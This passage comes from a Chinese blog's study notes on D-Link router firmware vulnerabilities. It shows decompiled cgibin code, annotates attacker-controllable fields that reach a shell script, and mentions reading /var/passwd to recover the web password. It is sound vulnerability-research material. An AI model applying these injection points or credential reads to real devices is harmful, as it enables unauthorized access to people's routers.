+<li><p>固件：<a href="http://legacyfiles.us.dlink.com/" target="_blank" rel="noopener">http://legacyfiles.us.dlink.com/</a></p>
+</li>
+<li><p>识别main</p>
+</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sub_97F4即main</span></span><br><span class="line">int start()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">return</span> ((int (__fastcall *)(int (*)()))_uClibc_main)(sub_97F4);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># rename后自动，恰好3参数</span></span><br><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>判定函数名</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通过调用者函数中的字符串对比</span></span><br><span class="line">  <span class="keyword">if</span> ( !strcmp(s1a, <span class="string">"conntrack.cgi"</span>) )</span><br><span class="line">    <span class="built_in">return</span> contrack_main(argc, argv, envp);</span><br><span class="line">  <span class="keyword">if</span> ( !strcmp(s1a, <span class="string">"hnap"</span>) )</span><br><span class="line">    <span class="built_in">return</span> hnap_main(argc, (int)argv, (int)envp);</span><br><span class="line">  <span class="keyword">if</span> ( !strcmp(s1a, <span class="string">"fwupload.cgi"</span>) )</span><br><span class="line">    <span class="built_in">return</span> fwupload_main(argc, argv, envp);</span><br></pre></td></tr></table></figure>
+<ul>
+<li>字符串check时，strstr有风险，不如strcmp，前者包含关系，后者等于关系</li>
+<li>strstr、strchr可用于截取字符串</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># r表示反向，如下为GetDeviceSettings</span></span><br><span class="line">soapaction = <span class="string">"http://purenetworks.com/HNAP1/GetDeviceSettings"</span>;</span><br><span class="line">soapaction = strrchr(soapaction, <span class="string">'/'</span>);</span><br></pre></td></tr></table></figure>
+<h2 id="IoT设备漏洞复现到固件后门植入"><a href="#IoT设备漏洞复现到固件后门植入" class="headerlink" title="IoT设备漏洞复现到固件后门植入"></a>IoT设备漏洞复现到固件后门植入</h2><p><a href="https://www.anquanke.com/post/id/232845" target="_blank" rel="noopener">https://www.anquanke.com/post/id/232845</a></p>
+<ul>
+<li>main中，依据不同uri调用不同函数</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  uri = *argv;</span><br><span class="line">  v6 = <span class="built_in">strrchr</span>(*argv, <span class="string">'/'</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v6 )</span><br><span class="line">    uri = v6 + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  v29 = <span class="built_in">strcmp</span>(uri, <span class="string">"gena.cgi"</span>);</span><br><span class="line">  func_envp = envp;</span><br><span class="line">  <span class="keyword">if</span> ( !v29 )</span><br><span class="line">  &#123;</span><br><span class="line">    func_name = genacgi_main;<span class="comment">// 间接调用，交叉引用，o类型而非p</span></span><br><span class="line">    func_argc = argc;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">int</span> (__fastcall *)(_DWORD, _DWORD, _DWORD))func_name)(func_argc, argv, func_envp);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>进程通信：cgibin中拼接后交由php文件处理、格式化字符串中开头即通信的php文件</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">handle_method_subscribe</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *service)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 按照文中，应该是第二处字符串拼接处，有pid</span></span><br><span class="line">  pid = getpid();</span><br><span class="line">  <span class="built_in">snprintf</span>(                                     <span class="comment">// 字符串拼接，构造各种全局变量（php中用</span></span><br><span class="line">                                                <span class="comment">// INF_UID、SHELL_FILE变量可控</span></span><br><span class="line">    v23,</span><br><span class="line">    <span class="number">0x200</span>u,</span><br><span class="line">    <span class="string">"%s\nMETHOD=SUBSCRIBE\nINF_UID=%s\nSERVICE=%s\nHOST=%s\nURI=/%s\nTIMEOUT=%d\nREMOTE=%s\nSHELL_FILE=%s/%s_%d.sh"</span>,</span><br><span class="line">    <span class="string">"/htdocs/upnp/run.NOTIFY.php"</span>,              <span class="comment">// 通信的php文件</span></span><br><span class="line">    server_id,</span><br><span class="line">    service,                                    <span class="comment">// inf_uid</span></span><br><span class="line">    v13 + <span class="number">7</span>,                                    <span class="comment">// host</span></span><br><span class="line">    v16 + <span class="number">1</span>,                                    <span class="comment">// uri</span></span><br><span class="line">    timeout,</span><br><span class="line">    remote_addr,</span><br><span class="line">    <span class="string">"/var/run"</span>,                                 <span class="comment">// shell_file来自如下3 </span></span><br><span class="line">    service,</span><br><span class="line">    pid);</span><br><span class="line">  xmldbc_ephp(<span class="number">0</span>, <span class="number">0</span>, v23, (<span class="keyword">int</span>)<span class="built_in">stdout</span>);          <span class="comment">// 进程通信:通过socket发送，交由php文件处理</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>更新固件两种方法<ul>
+<li>web端，cat /var/passwd获取密码</li>
+<li>telnet进入shell，固件更新脚本usr/sbin/fw_upgrade</li>
+<li>（实质上，web端更新也是调用的脚本，前者自动，后者手动</li>
+</ul>
+</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>21Guns
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://21guns.top/2020/04/17/iot/IOT安全-文章学习笔记-1/" title="IOT安全-文章学习笔记-1">http://21guns.top/2020/04/17/iot/IOT安全-文章学习笔记-1/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/路由器/" rel="tag"># 路由器</a>
+              <a href="/tags/漏洞分析/" rel="tag"># 漏洞分析</a>
+              <a href="/tags/栈溢出/" rel="tag"># 栈溢出</a>
+              <a href="/tags/摄像头/" rel="tag"># 摄像头</a>
+              <a href="/tags/命令注入/" rel="tag"># 命令注入</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/02/19/reverse/cve-2013-2551漏洞分析（整数溢出）/" rel="prev" title="cve-2013-2551漏洞分析（整数溢出）">
+      <i class="fa fa-chevron-left"></i> cve-2013-2551漏洞分析（整数溢出）
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/04/18/iot/iot安全文章整理/" rel="next" title="iot安全文章整理">
+      iot安全文章整理 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#IOT安全-文章学习笔记-1"><span class="nav-number">1.</span> <span class="nav-text">IOT安全-文章学习笔记-1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#路由器漏洞挖掘之栈溢出入门（二）"><span class="nav-number">1.1.</span> <span class="nav-text">路由器漏洞挖掘之栈溢出入门（二）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#路由器漏洞挖掘之栈溢出入门（三）ROP链的构造"><span class="nav-number">1.2.</span> <span class="nav-text">路由器漏洞挖掘之栈溢出入门（三）ROP链的构造</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一步一步PWN路由器之rop技术实战"><span class="nav-number">1.3.</span> <span class="nav-text">一步一步PWN路由器之rop技术实战</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一步一步PWN路由器之路由器环境修复-amp-amp-rop技术分析"><span class="nav-number">1.4.</span> <span class="nav-text">一步一步PWN路由器之路由器环境修复&amp;&amp;rop技术分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#路由器漏洞挖掘之栈溢出——反弹shell的payload构造"><span class="nav-number">1.5.</span> <span class="nav-text">路由器漏洞挖掘之栈溢出——反弹shell的payload构造</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#路由器漏洞挖掘之-DIR-805L-越权文件读取漏洞分析（应该是850"><span class="nav-number">1.6.</span> <span class="nav-text">路由器漏洞挖掘之 DIR-805L 越权文件读取漏洞分析（应该是850</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#路由器漏洞挖掘之-DIR-850-645-命令执行漏洞复现"><span class="nav-number">1.7.</span> <span class="nav-text">路由器漏洞挖掘之 DIR-850/645 命令执行漏洞复现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#通过CVE-2017-17215学习路由器漏洞分析，从入坑到放弃"><span class="nav-number">1.8.</span> <span class="nav-text">通过CVE-2017-17215学习路由器漏洞分析，从入坑到放弃</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2017-17215-HG532命令注入漏洞分析"><span class="nav-number">1.9.</span> <span class="nav-text">CVE-2017-17215-HG532命令注入漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#路由器漏洞复现分析第二弹：CNVD-2018-01084"><span class="nav-number">1.10.</span> <span class="nav-text">路由器漏洞复现分析第二弹：CNVD-2018-01084</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#路由器漏洞复现分析第三弹：DVRF-INTRO题目分析"><span class="nav-number">1.11.</span> <span class="nav-text">路由器漏洞复现分析第三弹：DVRF INTRO题目分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#路由器漏洞复现分析第四弹：CVE-2018-7034"><span class="nav-number">1.12.</span> <span class="nav-text">路由器漏洞复现分析第四弹：CVE-2018-7034</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#D-Link系列路由器漏洞挖掘入门"><span class="nav-number">1.13.</span> <span class="nav-text">D-Link系列路由器漏洞挖掘入门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#路由器0day漏洞挖掘实战"><span class="nav-number">1.14.</span> <span class="nav-text">路由器0day漏洞挖掘实战</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tenda某路由器信息泄露查找"><span class="nav-number">1.15.</span> <span class="nav-text">tenda某路由器信息泄露查找</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#D-Link路由器HNAP协议系列漏洞披露"><span class="nav-number">1.16.</span> <span class="nav-text">D-Link路由器HNAP协议系列漏洞披露</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#华硕路由器9999端口远程命令执行研究报告-V1"><span class="nav-number">1.17.</span> <span class="nav-text">华硕路由器9999端口远程命令执行研究报告 V1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析多款D-Link路由器中的未授权RCE漏洞"><span class="nav-number">1.18.</span> <span class="nav-text">分析多款D-Link路由器中的未授权RCE漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IoT-设备网络协议模糊测试工具boofuzz实战"><span class="nav-number">1.19.</span> <span class="nav-text">IoT 设备网络协议模糊测试工具boofuzz实战</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linksys-velop-authentication-bypass"><span class="nav-number">1.20.</span> <span class="nav-text">Linksys velop authentication bypass</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linksys-velop-zbtest-command-injection"><span class="nav-number">1.21.</span> <span class="nav-text">Linksys velop zbtest command injection</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linksys-velop-information-leak"><span class="nav-number">1.22.</span> <span class="nav-text">Linksys velop information leak</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwn2Own-Netgear-R6700-UPnP漏洞分析"><span class="nav-number">1.23.</span> <span class="nav-text">Pwn2Own Netgear R6700 UPnP漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Hacking-the-D-Link-DIR-890L"><span class="nav-number">1.24.</span> <span class="nav-text">Hacking the D-Link DIR-890L</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IoT设备漏洞复现到固件后门植入"><span class="nav-number">1.25.</span> <span class="nav-text">IoT设备漏洞复现到固件后门植入</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="21Guns" src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">21Guns</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">164</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">71</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="vx:lxllxllx1" title="Wechat → vx:lxllxllx1" rel="noopener" target="_blank"><i class="fab fa-weixin fa-fw"></i>Wechat</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://github.com/21Gun5" title="GitHub → https://github.com/21Gun5" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2016 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">21Guns</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script size="300" alpha="0.5" zindex="0" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/pisces.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
